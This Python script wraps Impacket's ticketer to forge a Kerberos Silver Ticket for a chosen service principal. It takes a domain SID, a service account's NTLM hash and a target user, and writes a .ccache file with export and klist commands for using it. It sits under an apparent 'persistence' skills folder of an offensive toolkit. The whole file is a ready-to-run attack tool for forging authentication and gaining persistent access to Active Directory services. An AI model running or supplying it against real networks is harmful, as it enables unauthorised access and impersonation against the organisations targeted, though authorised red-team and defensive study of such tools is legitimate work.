#!/usr/bin/env python3
"""Generate a Silver Ticket with Impacket ticketer for a target SPN.

Usage:
  python skills/persistence/scripts/silver_ticket.py -d corp.local --domain-sid S-1-5-21-... --service-hash <NTLM> --spn cifs/dc01.corp.local -u alice -o ./alice.ccache
"""

from __future__ import annotations

import argparse
import json
import shutil
import subprocess
import sys
from pathlib import Path


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Silver Ticket generator wrapper.")
    parser.add_argument("-d", "--domain", required=True)
    parser.add_argument("--domain-sid", required=True)
    parser.add_argument("--service-hash", required=True)
    parser.add_argument("-u", "--user", required=True)
    parser.add_argument("--spn", required=True)
    parser.add_argument("-o", "--output", required=True, help="Output .ccache path")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    output_path = Path(args.output).resolve()
    output_path.parent.mkdir(parents=True, exist_ok=True)
    tool = shutil.which("impacket-ticketer") or shutil.which("ticketer.py")

    command = [
        tool or "impacket-ticketer",
        "-nthash",
        args.service_hash,
        "-domain-sid",
        args.domain_sid,
        "-domain",
        args.domain,
        "-spn",
        args.spn,
        "-save",
        str(output_path),
        args.user,
    ]

    payload = {
        "ticket_type": "silver",
        "tool": tool or "impacket-ticketer",
        "tool_found": bool(tool),
        "command": command,
        "ticket_path": str(output_path),
        "export_command": f"export KRB5CCNAME={output_path}",
        "verification_command": f"klist -c {output_path}",
    }

    if not tool:
        print("[!] ticketer tool not found. Printing command only.", file=sys.stderr)
        print(" ".join(command))
        print(json.dumps(payload, indent=2, ensure_ascii=False))
        return 0

    result = subprocess.run(command, capture_output=True, text=True, check=False)
    payload["return_code"] = result.returncode
    payload["stdout"] = result.stdout.strip()
    payload["stderr"] = result.stderr.strip()
    print(json.dumps(payload, indent=2, ensure_ascii=False))
    return 0 if result.returncode == 0 else result.returncode


if __name__ == "__main__":
    raise SystemExit(main())
